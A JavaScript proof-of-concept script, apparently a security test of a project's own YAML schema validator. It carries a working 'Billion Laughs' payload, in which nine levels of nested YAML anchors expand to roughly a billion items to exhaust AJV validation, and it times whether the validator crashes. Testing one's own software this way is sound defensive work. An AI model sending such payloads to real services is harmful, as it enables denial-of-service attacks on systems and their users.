
import { validateSchema } from '../../src/validator/schema-validator.js';
import { performance } from 'perf_hooks';

console.log('Starting DoS PoC (AJV + Billion Laughs)...');

// We need to bypass the 'additionalProperties: false' check.
// We can define anchors in a 'comment' or unused field?
// No, standard YAML allows anchors on any node.
// We can use 'constraints' which is an array of strings.
// or 'self_check'.

// Structure:
// define anchors in 'self_check' (array of strings).
// But 'self_check' items must be strings (min length 10).
// If we expand to an array, schema validation for 'self_check' will fail (type: string expected).
// But AJV has to check it first!
// If we expand to a huge array, AJV will check "is this a string?" for every item.

const payload = `
identity: "Attacker"
purpose: "Attempting to crash the validator with billion laughs"
context:
  platform: "macOS"
  access_method: "desktop"
  auth_state: "logged_in"
  environment: "macOS"
inputs:
  - name: "input1"
    required: true
    description: "test"
task:
  goal: "Crash it"
  steps: []
output_format:
  type: "yaml"

# The Bomb
# We define anchors on valid nodes but reuse them to create depth.
# We'll use 'constraints' to hold the bomb.
# constraints expects an array of strings.
# We will create an array of arrays of arrays...
# AJV will validate: "is array?" Yes. "items: string?"
# It will traverse the nested arrays and fail on the inner items (arrays not strings).
# But it has to traverse them first.

constraints: &root
  - &l1 ["fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail", "fail fail fail fail"]
  - &l2 [*l1, *l1, *l1, *l1, *l1, *l1, *l1, *l1, *l1, *l1]
  - &l3 [*l2, *l2, *l2, *l2, *l2, *l2, *l2, *l2, *l2, *l2]
  - &l4 [*l3, *l3, *l3, *l3, *l3, *l3, *l3, *l3, *l3, *l3]
  - &l5 [*l4, *l4, *l4, *l4, *l4, *l4, *l4, *l4, *l4, *l4]
  - &l6 [*l5, *l5, *l5, *l5, *l5, *l5, *l5, *l5, *l5, *l5]
  - &l7 [*l6, *l6, *l6, *l6, *l6, *l6, *l6, *l6, *l6, *l6]
  - &l8 [*l7, *l7, *l7, *l7, *l7, *l7, *l7, *l7, *l7, *l7]
  - &l9 [*l8, *l8, *l8, *l8, *l8, *l8, *l8, *l8, *l8, *l8]

# Expansion: 10^9 = 1 billion items.
# Each item is a string.
# AJV will check 1 billion items.

self_check:
  - "Validation question 1"
`;

const start = performance.now();
try {
    const result = validateSchema(payload);
    const end = performance.now();
    console.log(`Validation finished in ${(end - start).toFixed(2)}ms`);
    console.log(`Valid: ${result.valid}`);
    if (result.errors.length > 0) {
        console.log(`Errors: ${result.errors.length}`);
        console.log(result.errors[0]);
    }
} catch (error) {
    const end = performance.now();
    console.log(`Validation CRASHED in ${(end - start).toFixed(2)}ms`);
    console.error('Error:', error.message);
}
